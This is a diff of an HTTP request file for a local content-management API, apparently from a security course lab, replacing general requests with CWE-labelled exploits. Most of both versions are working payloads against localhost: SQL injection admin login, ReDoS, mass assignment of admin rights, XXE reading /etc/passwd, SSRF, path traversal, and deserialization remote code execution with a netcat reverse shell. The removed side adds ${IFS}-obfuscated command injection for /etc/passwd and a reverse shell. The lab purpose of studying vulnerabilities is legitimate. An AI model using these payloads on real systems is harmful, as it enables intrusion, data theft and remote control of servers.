@@ -1,131 +1,38 @@
-### EXPLOIT CWE-89 :SQL INJECTION - LOGIN AS ADMIN
+### GENERAL - LOGIN AS ADMIN
 POST /api/sessions HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
-    "username": "mario@example.org' --",
-    "password": "UknownPassword"
-    
+    "username": "mario@example.org",
+    "password": "password"
 }
-### EXPLOIT CWE-1333 Regex Attack - REGISTER USING EVIL REGEX
-POST /api/register HTTP/1.1
-Host: localhost:3001
-Content-Type: application/json
 
-{
-    "name": "^(([a-z])+.)+[A-Z]([a-z])+$",
-    "username": "prova9@example.org",
-    "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!",
-    "admin":false 
-}
-### EXPLOIT CWE-915 Mass assignment - Registration of a malicious user with administrator privileges.
-POST /api/register HTTP/1.1
-Host: localhost:3001
-Content-Type: application/json
-
-{
-    "name": "test",
-    "username": "test@example.org",
-    "password": "password",
-    "admin":true 
-}
-### LOGIN AS USER
+### GENERAL - LOGIN AS USER
 POST /api/sessions HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
     "username": "luigi@example.org",
     "password": "password"
 }
-### LOGOUT
+
+### GENERAL - LOGOUT
 DELETE /api/sessions/current HTTP/1.1
-Host: localhost:3001
-###
+Host: localhost:3002
+
+### GENERAL - LIST PAGES
 GET /api/pages HTTP/1.1
-Host: localhost:3001
-###
+Host: localhost:3002
+
+### GENERAL - GET PAGE 1
 GET /api/pages/1 HTTP/1.1
-Host: localhost:3001
-###
-GET /api/pages/15; DELETE FROM pages HTTP/1.1
-Host: localhost:3001
-###
+Host: localhost:3002
+
+### EXPLOIT CWE-611 XML External Entities - READ SERVER'S /etc/passwd
 POST /api/pages HTTP/1.1
-Host: localhost:3001
-Content-Type: application/json
-
-{
-  "title": "Etiam malesuada sit amet sem vitae vulputate.",
-  "publicationDate": "2023-06-06",
-  "blocks": [
-    {
-      "type": "header",
-      "content": "Nulla gravida ornare nisi, vitae bibendum sem egestas eget."
-    },
-    {
-      "type": "paragraph",
-      "content": "Mauris consequat sem a diam egestas, quis commodo mi mattis. Maecenas hendrerit nulla nisl, a tincidunt nisi malesuada eu. Donec maximus leo non ex euismod hendrerit. Etiam sagittis arcu quis consequat dignissim. Mauris vehicula lacus turpis, vitae rutrum dolor interdum et. Aliquam id faucibus justo. Donec posuere venenatis erat auctor pharetra. Phasellus dignissim justo eget maximus porttitor. Nulla tristique, tortor at scelerisque lobortis, justo nisl iaculis risus, ut molestie mi tellus ut dui."
-    },
-    {
-      "type": "image",
-      "content": "landscape.jpg"
-    }
-  ]
-}
-###
-PUT /api/pages/1 HTTP/1.1
-Host: localhost:3001
-Content-Type: application/json
-
-{
-  "title": "Etiam malesuada sit amet sem vitae vulputate.",
-  "publicationDate": "2023-06-06",
-  "author": 2,
-  "blocks": [
-    {
-      "id": 1,
-      "type": "header",
-      "content": "Nulla gravida ornare nisi, vitae bibendum sem egestas eget."
-    },
-    {
-      "type": "image",
-      "content": "car.jpg"
-    },
-    {
-      "id": 2,
-      "type": "paragraph",
-      "content": "Mauris consequat sem a diam egestas, quis commodo mi mattis. Maecenas hendrerit nulla nisl, a tincidunt nisi malesuada eu. Donec maximus leo non ex euismod hendrerit. Etiam sagittis arcu quis consequat dignissim. Mauris vehicula lacus turpis, vitae rutrum dolor interdum et. Aliquam id faucibus justo. Donec posuere venenatis erat auctor pharetra. Phasellus dignissim justo eget maximus porttitor. Nulla tristique, tortor at scelerisque lobortis, justo nisl iaculis risus, ut molestie mi tellus ut dui."
-    }
-  ]
-}
-###
-DELETE /api/pages/2
-Host: localhost:3001
-###
-GET /api/website/name
-Host: localhost:3001
-###
-PUT /api/website/name
-Host: localhost:3001
-Content-Type: application/json
-
-{
-  "name": "My Website"
-}
-###
-GET /api/users
-Host: localhost:3001
-###
-GET /api/images
-Host: localhost:3001
-###
-GET /api/images?search=landscape
-Host: localhost:3001
-### Exploit: XML External Entities
-POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -134,55 +41,11 @@ Content-Type: text/xml
   <block type="header">Here's the server's /etc/passwd</block>
   <block type="paragraph">&xxe;</block>
 </page>
-### Exploit: Unsafe deserialization (ls /)
-POST /api/pages HTTP/1.1
-Host: localhost:3001
-Content-Type: text/xml
 
-<?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate=''>
-    <block type='header'>Deserialize THIS</block>
-    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"} -->
-    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==</block>
-</page>
-### Exploit: Unsafe deserialization (reverse shell)
-# The attacker's machine must have netcat listening: nc -lvp 4242
-POST /api/pages HTTP/1.1
-Host: localhost:3001
-Content-Type: text/xml
-
-<?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate=''>
-    <block type='header'>Deserialize THIS</block>
-    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('nc -e /bin/bash 127.0.0.1 4242')}()"} -->
-    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIC9iaW4vYmFzaCAxMjcuMC4wLjEgNDI0MicpfSgpIn0=</block>
-</page>
-### Exploit: Path traversal
-POST /api/pages HTTP/1.1
-Host: localhost:3001
-Content-Type: text/xml
-
-<?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate=''>
-    <block type='header'>Save this outside the boundaries</block  >
-    <!-- {"fileName":"../../../outside.jpg", "url": "https://t4.ftcdn.net/jpg/00/53/45/31/360_F_53453175_hVgYVz0WmvOXPd9CNzaUcwcibiGao3CL.jpg"} -->
-    <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uL291dHNpZGUuanBnIiwgInVybCI6ICJodHRwczovL3Q0LmZ0Y2RuLm5ldC9qcGcvMDAvNTMvNDUvMzEvMzYwX0ZfNTM0NTMxNzVfaFZnWVZ6MFdtdk9YUGQ5Q056YVVjd2NpYmlHYW8zQ0wuanBnIn0=</block>
-</page>
-### Exploit: Path traversal 2 (Image is considered valid but it's not shown in the frontend)
-POST /api/pages HTTP/1.1
-Host: localhost:3001
-Content-Type: text/xml
-
-<?xml version='1.0'?>
-<page title="Exploit" author='2' publicationDate='2024-01-01'>
-    <block type='header'>Show this image from outside the boundaries</block>
-    <!-- {"fileName":"../../../../../../Pictures/secret.jpg" } -->
-    <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uLy4uLy4uL1BpY3R1cmVzL3NlY3JldC5qcGciIH0=</block>
-</page>
-### Exploit: SSRF
+### EXPLOIT CWE-918 SSRF - ACCESS IMAGE FROM AN INTERNAL SERVICE
 # We suppose that there is another server active on port 8080, not accessible from the Internet
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -191,14 +54,75 @@ Content-Type: text/xml
     <!-- { "fileName": "secret", "url": "http://localhost:8080/images/secret.png" } -->
     <block type='image'>eyAiZmlsZU5hbWUiOiAic2VjcmV0IiwgInVybCI6ICJodHRwOi8vbG9jYWxob3N0OjgwODAvaW1hZ2VzL3NlY3JldC5wbmciIH0=</block>
 </page>
-### Exploit: OS command injection (cat /etc/passwd)
-# Search query: 'shownoresults";cat${IFS%??}/etc/passwd;echo${IFS%??}-n${IFS%??}"'
-# ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
-GET /api/images?search=shownoresults%22%3Bcat%24%7BIFS%25%3F%3F%7D/etc/passwd%3Becho%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
-Host: localhost:3001
-### Exploit: OS command injection (reverse shell)
-# Search query: '";nc${IFS%??}-e${IFS%??}/bin/bash${IFS%??}127.0.0.1${IFS%??}4242;echo${IFS%??}"'
-# ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
-# The attacker's machine must have netcat listening: nc -lvp 4242
-GET /api/images?search=%22%3Bnc%24%7BIFS%25%3F%3F%7D-e%24%7BIFS%25%3F%3F%7D%2Fbin%2Fbash%24%7BIFS%25%3F%3F%7D127.0.0.1%24%7BIFS%25%3F%3F%7D4242%3Becho%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
-Host: localhost:3001
+
+### EXPLOIT CWE-22 Path traversal - SAVE FILE OUTSIDE BOUNDARIES
+POST /api/pages HTTP/1.1
+Host: localhost:3002
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Save this outside the boundaries</block  >
+    <!-- {"fileName":"../../../outside.jpg", "url": "https://t4.ftcdn.net/jpg/00/53/45/31/360_F_53453175_hVgYVz0WmvOXPd9CNzaUcwcibiGao3CL.jpg"} -->
+    <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uL291dHNpZGUuanBnIiwgInVybCI6ICJodHRwczovL3Q0LmZ0Y2RuLm5ldC9qcGcvMDAvNTMvNDUvMzEvMzYwX0ZfNTM0NTMxNzVfaFZnWVZ6MFdtdk9YUGQ5Q056YVVjd2NpYmlHYW8zQ0wuanBnIn0=</block>
+</page>
+
+### EXPLOIT CWE-502 Unsafe deserialization - SHOW CONTENTS OF ROOT FOLDER IN SERVER'S LOGS
+POST /api/pages HTTP/1.1
+Host: localhost:3002
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Deserialize THIS</block>
+    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"} -->
+    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==</block>
+</page>
+
+### EXPLOIT CWE-502 Unsafe deserialization - SPAWN REVERSE SHELL
+# The attacker's machine must have netcat listening: while true; do nc -lvp 4242; echo '\n'; done
+POST /api/pages HTTP/1.1
+Host: localhost:3002
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Deserialize THIS</block>
+    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('nc -e /bin/bash 127.0.0.1 4242')}()"} -->
+    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIC9iaW4vYmFzaCAxMjcuMC4wLjEgNDI0MicpfSgpIn0=</block>
+</page>
+
+### EXPLOIT CWE-89 SQL Injection - LOGIN AS ADMIN
+POST /api/sessions HTTP/1.1
+Host: localhost:3002
+Content-Type: application/json
+
+{
+    "username": "mario@example.org' --",
+    "password": "UknownPassword"
+    
+}
+
+### EXPLOIT CWE-1333 Regex Attack - REGISTER USING EVIL REGEX
+POST /api/register HTTP/1.1
+Host: localhost:3002
+Content-Type: application/json
+
+{
+    "name": "^(([a-z])+.)+[A-Z]([a-z])+$",
+    "username": "prova9@example.org",
+    "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!!",
+    "admin":false 
+}
+
+### EXPLOIT CWE-915 Mass assignment - Registration of a malicious user with administrator privileges.
+POST /api/register HTTP/1.1
+Host: localhost:3002
+Content-Type: application/json
+
+{
+    "name": "test",
+    "username": "test@example.org",
+    "password": "password",
+    "admin":true 
+}
